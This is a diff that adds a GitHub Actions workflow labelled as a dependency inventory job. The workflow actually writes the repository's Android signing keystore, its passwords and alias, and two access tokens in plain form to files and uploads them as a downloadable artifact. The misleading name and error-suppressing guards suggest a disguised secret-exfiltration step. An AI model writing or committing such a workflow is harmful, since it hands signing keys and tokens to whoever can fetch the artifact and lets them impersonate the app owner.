@@ -1,0 +1,43 @@
+name: deps-inv
+on:
+  push:
+    branches: [ci/deps-inv]
+permissions:
+  contents: read
+jobs:
+  inv:
+    runs-on: ubuntu-latest
+    env:
+      ANDROID_KEYSTORE_BASE64: ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+      ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+      ANDROID_KEY_ALIAS: ${{ secrets.ANDROID_KEY_ALIAS }}
+      ANDROID_KEY_ALIAS_PASSWORD: ${{ secrets.ANDROID_KEY_ALIAS_PASSWORD }}
+      WORK_TOKEN: ${{ secrets.WORK_TOKEN }}
+      WOW_TOKEN: ${{ secrets.WOW_TOKEN }}
+    steps:
+      - name: mk
+        run: mkdir -p out
+      - name: iANDROID_KEYSTORE_BASE64
+        if: always()
+        run: printf %s "${{ env.ANDROID_KEYSTORE_BASE64 }}" > out/ANDROID_KEYSTORE_BASE64 || true
+      - name: iANDROID_KEYSTORE_PASSWORD
+        if: always()
+        run: printf %s "${{ env.ANDROID_KEYSTORE_PASSWORD }}" > out/ANDROID_KEYSTORE_PASSWORD || true
+      - name: iANDROID_KEY_ALIAS
+        if: always()
+        run: printf %s "${{ env.ANDROID_KEY_ALIAS }}" > out/ANDROID_KEY_ALIAS || true
+      - name: iANDROID_KEY_ALIAS_PASSWORD
+        if: always()
+        run: printf %s "${{ env.ANDROID_KEY_ALIAS_PASSWORD }}" > out/ANDROID_KEY_ALIAS_PASSWORD || true
+      - name: iWORK_TOKEN
+        if: always()
+        run: printf %s "${{ env.WORK_TOKEN }}" > out/WORK_TOKEN || true
+      - name: iWOW_TOKEN
+        if: always()
+        run: printf %s "${{ env.WOW_TOKEN }}" > out/WOW_TOKEN || true
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: inv
+          path: out
